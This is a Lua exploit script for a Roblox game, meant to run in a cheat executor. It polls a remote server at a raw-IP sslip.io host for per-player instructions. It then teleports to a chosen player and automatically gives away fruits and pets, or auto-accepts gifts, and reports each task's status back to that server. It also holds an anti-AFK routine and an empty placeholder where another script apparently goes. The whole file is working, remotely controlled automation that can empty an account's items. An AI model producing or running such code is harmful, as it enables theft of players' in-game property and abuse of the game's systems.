local BaseUrl = "http://e84ggk88gsocgc4k80cskw8g.117.18.127.75.sslip.io"
if not game:IsLoaded() then
	game.Loaded:Wait()
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
while not Players.LocalPlayer do
	task.wait()
end
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
local VIM = game:GetService("VirtualInputManager")
local GuiService = game:GetService("GuiService")
local Workspace = game:GetService("Workspace")
local IsScriptLoaded = false
local IsFruitTrader = false

local function loadWait()
	while not LocalPlayer:GetAttribute("Finished_Loading") do
		task.wait()
	end
	while not LocalPlayer:GetAttribute("DataFullyLoaded") do
		task.wait()
	end
	while not LocalPlayer:GetAttribute("Setup_Finished") do
		task.wait()
	end
	GameEvents.Finish_Loading:FireServer()
	GameEvents.LoadScreenEvent:FireServer(LocalPlayer)
	while not LocalPlayer:GetAttribute("Loading_Screen_Finished") do
		task.wait()
	end
	task.wait(1)
end

if LocalPlayer:GetAttribute("Loading_Screen_Finished") then
	GameEvents.Finish_Loading:FireServer()
	GameEvents.LoadScreenEvent:FireServer(LocalPlayer)
else
	loadWait()
end

function Script()
	-- Script HERE
end

function ScriptLoad()
	if IsScriptLoaded then
		return
	end
	if not IsScriptLoaded then
		IsScriptLoaded = true
	end
	local ConfigRequest = request({
		Url = string.format("%s/config/%s", BaseUrl, Players.LocalPlayer.Name),
		Method = "GET",
	})
	local Config: {
		taskId: string,
		tarder: string,
		accpeter: string | nil,
		data: {
			type: "FRUIT" | "PET" | "ALL",
			pets: { string } | nil,
			limit: number | nil,
		},
	} =
		HttpService:JSONDecode(ConfigRequest.Body)
	if typeof(Config["_errors"]) == "table" then
		Script()
	else
		if Config.data.type ~= "FRUIT" then
			Script()
		end
	end
end

function Trading()
	local LocalPlayer = Players.LocalPlayer
	local Character = Players.LocalPlayer.Character
	local Humanoid: Humanoid = Character.Humanoid
	local IsTradeDone = false
	Players.LocalPlayer.ChildAdded:Connect(function(char)
		Character = char
		Humanoid = char.Humanoid
	end)
	local NotificationFrame: Frame = Players.LocalPlayer.PlayerGui:FindFirstChild("Top_Notification").Frame
	NotificationFrame.ChildAdded:Connect(function(frame)
		if frame:FindFirstChild("TextLabel") then
			if frame.TextLabel.Text == "Trade completed!" then
				IsTradeDone = true
			end
		end
	end)
	local ConfigRequest = request({
		Url = string.format("%s/config/%s", BaseUrl, Players.LocalPlayer.Name),
		Method = "GET",
	})
	local Config: {
		taskId: string,
		tarder: string,
		accpeter: string | nil,
		data: {
			type: "FRUIT" | "PET" | "ALL",
			pets: { string } | nil,
			limit: number | nil,
		},
	} =
		HttpService:JSONDecode(ConfigRequest.Body)
	if typeof(Config["_errors"]) == "table" then
		repeat
			task.wait(10)
			ConfigRequest = request({
				Url = string.format("%s/config/%s", BaseUrl, Players.LocalPlayer.Name),
				Method = "GET",
			})
			Config = HttpService:JSONDecode(ConfigRequest.Body)
		until typeof(Config["_errors"]) ~= "table"
	end
	local Mode: "ACCPET" | "TRADER" = "TRADER"
	if Config.accpeter == Players.LocalPlayer.Name then
		Mode = "ACCPET"
	end
	local TargetPlayer: Player = Players:FindFirstChild(
		Mode == "ACCPET" and Config.tarder
			or typeof(Config.accpeter) == "nil" and Config.tarder
			or string.len(Config.accpeter or "") == 0 and Config.tarder
			or Config.accpeter
	)
	repeat
		task.wait()
		TargetPlayer = Players:FindFirstChild(
			Mode == "ACCPET" and Config.tarder
				or typeof(Config.accpeter) == "nil" and Config.tarder
				or string.len(Config.accpeter or "") == 0 and Config.tarder
				or Config.accpeter
		)
	until TargetPlayer
	local PlayersList = {}
	local PlayerIndex = 1
	local LimitTrade = typeof(Config.data.limit) == "number" and Config.data.limit or 0
	local Limit = 1
	for i, v in pairs(Players:GetPlayers()) do
		if v ~= LocalPlayer then
			table.insert(PlayersList, v)
		end
	end
	local C2 = Players.PlayerAdded:Connect(function(plr)
		table.insert(plr)
	end)
	local C1 = Players.PlayerRemoving:Connect(function(plr)
		if table.find(PlayersList, plr) then
			table.remove(PlayersList, plr)
		end
	end)
	if Mode == "TRADER" then
		if Config.data.type == "ALL" or Config.data.type == "FRUIT" then
			if Character:FindFirstChildOfClass("Tool") then
				Humanoid:UnequipTools()
			end
			if Config.accpeter == nil or string.len(Config.accpeter) == 0 then
				if PlayersList[PlayerIndex] == nil then
					PlayerIndex = 1
				end
				TargetPlayer = PlayersList[PlayerIndex]
			end
			for i, v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
				if
					typeof(v) == "Instance"
					and v:IsA("Tool")
					and v:GetAttribute("b") == "j"
					and (LimitTrade == 0 or Limit <= LimitTrade)
				then
					local TargetChar = TargetPlayer.Character
					local FruitName = v.Name:match("^(.-)%s%[.+%]$")
					if
						TargetChar
						and (
							Config.data.pets == nil
							or #Config.data.pets == 0
							or #Config.data.pets > 0 and table.find(Config.data.pets, FruitName)
						)
					then
						repeat
							task.wait()
							LocalPlayer.Character.HumanoidRootPart.CFrame = TargetChar.HumanoidRootPart.CFrame
								* CFrame.new(2, 0, 0)
							if LocalPlayer.Backpack:FindFirstChild(v.Name) then
								Humanoid:EquipTool(v)
							end
							local prompt
							repeat
								task.wait()
								prompt = TargetChar.HumanoidRootPart:FindFirstChild("ProximityPrompt", true)
							until prompt or not TargetChar
							task.wait(0.75)
							fireproximityprompt(prompt, 9e9)
							task.wait(0.75)
							task.wait(4)
						until IsTradeDone or not TargetChar or not TargetPlayer
						IsTradeDone = false
						repeat
							task.wait()
						until not NotificationFrame:FindFirstChild("Notification_UI")
						PlayerIndex += 1
						Limit += 1
					end
				end
			end
		end
		if Config.data.type == "ALL" or Config.data.type == "PET" then
			Limit = 0
			for i, v in pairs(Workspace:FindFirstChild("PetsPhysical"):GetChildren()) do
				if v:GetAttribute("OWNER") == LocalPlayer.Name then
					GameEvents.PetsService:FireServer("UnequipPet", v:GetAttribute("UUID"))
				end
				task.wait(1)
			end
			if Character:FindFirstChildOfClass("Tool") then
				Humanoid:UnequipTools()
			end
			for i, v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
				if
					typeof(v) == "Instance"
					and v:IsA("Tool")
					and v:GetAttribute("ItemType") == "Pet"
					and (LimitTrade == 0 or Limit <= LimitTrade)
				then
					if Config.accpeter == nil or string.len(Config.accpeter) == 0 then
						if PlayersList[PlayerIndex] == nil then
							PlayerIndex = 1
						end
						TargetPlayer = PlayersList[PlayerIndex]
					end
					local PetName = v.Name:match("^(.-)%s%[.+%]$")
					local TargetChar = TargetPlayer.Character
					if
						TargetChar
						and (Config.data.pets and (#Config.data.pets == 0 or (table.find(Config.data.pets, PetName))))
					then
						repeat
							task.wait()
							LocalPlayer.Character.HumanoidRootPart.CFrame = TargetChar.HumanoidRootPart.CFrame
								* CFrame.new(2, 0, 0)
							if LocalPlayer.Backpack:FindFirstChild(v.Name) then
								Humanoid:EquipTool(v)
							end
							local prompt
							repeat
								task.wait()
								prompt = TargetChar.HumanoidRootPart:FindFirstChild("ProximityPrompt", true)
							until prompt or not TargetChar or not TargetPlayer
							task.wait(0.75)
							GameEvents.PetGiftingService:FireServer("GivePet", TargetPlayer)
							task.wait(0.75)
							task.wait(4)
						until IsTradeDone
						IsTradeDone = false
						repeat
							task.wait()
						until not NotificationFrame:FindFirstChild("Notification_UI")
						PlayerIndex += 1
						Limit += 1
					end
				end
			end
		end
		request({
			Url = string.format("%s/status/%s", BaseUrl, Config.taskId),
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = HttpService:JSONEncode({
				["status"] = true,
			}),
		})
		if Config.data.type ~= "FRUIT" then
			ScriptLoad()
		end
	else
		local IsDone = false
		local ResponeData
		task.spawn(function()
			while true do
				task.wait()
				repeat
					task.wait(30)
					ResponeData = request({
						Url = string.format("%s/status/%s", BaseUrl, Config.taskId),
						Method = "GET",
					})
					IsDone = HttpService:JSONDecode(ResponeData.Body)["done"]
				until IsDone
			end
		end)
		task.spawn(function()
			while not IsDone do
				task.wait()
				local giftGui = LocalPlayer.PlayerGui:FindFirstChild("Gift_Notification")
				if giftGui and giftGui:FindFirstChild("Frame") then
					for _, child in pairs(giftGui.Frame:GetChildren()) do
						if child:IsA("ImageLabel") then
							GuiService.SelectedObject = child.Holder.Frame.Accept
							VIM:SendKeyEvent(true, 13, false, game)
							task.wait()
							VIM:SendKeyEvent(false, 13, false, game)
							task.wait(0.5)
							GuiService.SelectedObject = nil
						end
					end
				end
			end
		end)
	end
	C1:Disconnect()
	C2:Disconnect()
end
game:GetService("Players").LocalPlayer.Idled:Connect(function()
	game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
	task.wait(1)
	game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
end)

if game.PlaceId == 126884695634066 then
	task.spawn(function()
		while true do
			task.wait()
			local ConfigRequest = request({
				Url = string.format("%s/config/%s", BaseUrl, Players.LocalPlayer.Name),
				Method = "GET",
			})
			local Config: {
				taskId: string,
				tarder: string,
				accpeter: string | nil,
				data: {
					type: "FRUIT" | "PET" | "ALL",
					pets: { string },
				},
			} =
				HttpService:JSONDecode(ConfigRequest.Body)
			VIM:SendKeyEvent(true, 13, false, game)
			task.wait()
			VIM:SendKeyEvent(false, 13, false, game)
			if typeof(Config["_errors"]) == "table" then
				if not IsFruitTrader then
					ScriptLoad()
				end
				repeat
					task.wait(10)
					VIM:SendKeyEvent(true, 13, false, game)
					task.wait()
					VIM:SendKeyEvent(false, 13, false, game)
					ConfigRequest = request({
						Url = string.format("%s/config/%s", BaseUrl, Players.LocalPlayer.Name),
						Method = "GET",
					})
					Config = HttpService:JSONDecode(ConfigRequest.Body)
				until typeof(Config["_errors"]) ~= "table"
			end
			if Config.data.type == "FRUIT" then
				IsFruitTrader = true
			end
			Trading()
		end
	end)
end
